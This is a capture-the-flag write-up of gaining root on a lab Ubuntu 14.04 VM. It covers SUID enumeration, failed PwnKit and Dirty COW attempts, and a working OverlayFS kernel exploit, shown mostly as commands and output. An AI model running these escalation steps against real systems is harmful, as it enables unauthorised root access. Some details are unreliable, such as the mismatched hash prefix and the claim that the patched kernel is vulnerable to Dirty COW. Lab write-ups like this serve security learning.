# Challenge 1 - Gain Access to a Remote Server

## Challenge Description

A drive link containing a saic.ova file is provided. It is to be imported into a Virtual Box and run as a Guest, it will act as a remote server hosting a site wich can be seen on my localhost.

### Objective

To get inside the server by exploiting vulnerabilities and find a flag present at root/flag.txt by obtaining root privilages

### Scope and Constraints

1. Not to use Metasploit
2. Strictly not accessing the mounted disk from outside the VM environment
3. Not using Recovery Mode or GRUB Terminal to gain root access
4. Access to server is limited to a VM enviroment only

### Environment

- Virtualization Platform: VirtualBox
- Initial User: `student`
- Initial Privilege Level: Standard user
- Network Mode: NAT

## Initial Access

- username : student
- password : saic

## Trying To Escalate Privilages

### Trying Sudo Misconfigurations

Command:

```bash
sudo -l
```

Output :

```text
Sorry, user student may not run sudo on saic-VirtualBox.
```

This indicates that there are no sudo misconfigurations, and a different privilege escalation approach is required.

### Trying to Enumerate and Exploit SUID binaries

Command:

```bash
find / -perm -4000 -type f 2>/dev/null
```
to find potentially vulnerable SUID binaries.

Output:

```text
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/opt/VBoxGuestAdditions-7.1.6/bin/VBoxDRMClient
/bin/ping6
/bin/su
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
```
Here, /usr/bin/pkexec can be further inspected as a potential vulnerability. The next step is to check its version and ownership.

Command:

```bash
pkexec --version
ls -l /usr/bin/pkexec
```

Output:

```text
pkexec version 0.105
-rwsr-xr-x 1 root root 23304 Mar 27  2019 /usr/bin/pkexec
```

The pkexec binary is set to SUID, as indicated by the s permission bit in -rwsr-xr-x. The timestamp indicates it predates recent security patches, and the binary is owned by root, making it a suitable candidate for privilege escalation attempts.

The pkexec binary executes with root privileges due to its SUID configuration. In vulnerable versions, improper handling of user-supplied arguments and environment variables allows execution paths to be reached prior to policy enforcement, resulting in local privilege escalation.

Now an exploitation attempt can be made by trying to use pkexec

Command:

```bash
pkexec /bin/sh
```
Output:

It asked for authentication via password. This mean it is not directly exploitable so a different approach has to be attempted.
Also, this is same behaviour as CVE-2021-4034, a well know vulnarebility in polkit.
So, now a script in C can be used to potentially exploit it

Commands:

```bash
 gcc pwnkit.c -o pwnkit
 ls -l pwnkit
 env -i SHELL=/bin/sh PATH=/usr/bin:/bin pkexec ./pwnkit
```
Output:

```text
-rwxrwxr-x 1 student student 8625 Jan 16 17:05 pwnkit
Error executing command as another user: Request dismissed
```
This means that this VM is NOT exploitable via the generic PwnKit PoC path and some other alternate has to be used.

Another potentially vulnerable SUID bin is /bin/mount, to check if there is a possibility of exploitation

Command:

```bash
mount
```
Output:

```text
/dev/sda1 on / type ext4 (rw,errors=remount-ro)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
none on /sys/fs/cgroup type tmpfs (rw)
none on /sys/fs/fuse/connections type fusectl (rw)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)
none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
none on /sys/fs/pstore type pstore (rw)
systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)
gvfsd-fuse on /run/user/1001/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,user=student)
```
It suggests that none of these can be exploited as they are hardened with noexec,nosuid,nodev

This suggests SUID enumeration is a dead end

### Kernal Enumeration and Exploitation Attempt

For this first the kernal has to be inspected

Command:

```bash
uname -a
cat /etc/os-release
cat /proc/version
```

Output:

```text
Linux saic-VirtualBox 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="14.04.6 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.6 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
Linux version 4.4.0-148-generic (buildd@lgw01-amd64-014) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.4) ) #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019
```
The system runs Ubuntu 14.04.6 LTS with Linux kernel 4.4.0-148.
CVE-2016-5195 (Dirty COW) affects all Linux kernels prior to 4.8.3.
Ubuntu 14.04 does not include a complete backport of the fix in this kernel version.
Therefore, the kernel is vulnerable to local privilege escalation via Dirty COW.

Dirty COW

Commands:

```bash
gcc -pthread dirtycow.c -o dirtycow
openssl passwd -1 -salt root saicroot
```
Output:

```text
$1$root$s7CcFZTo6sal/cern6m2c/
```
Running Dirty COW 

```bash
./dirtycow $6$root$s7CcFZTo6sal/cern6m2c/
su root
```
Result:
```text
su: Permission denied
```
dirty COW didn't work, now as a backup, OverlayFS can be used

Attempting OverlayFS:

Command:

```bash
gcc exploit.c -o exploit
./exploit
```
Output:

```text
bash-4.3#
```
this open another terminal with root access

Further Commands in this terminal:

```bash
whoami
id
cd /root
cat flag.txt
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root),1001(student)
SAIC{C0ngr4ts_d0_y0u_l0v3_ST4C?}
```
## Solved
### Flag = SAIC{C0ngr4ts_d0_y0u_l0v3_ST4C?}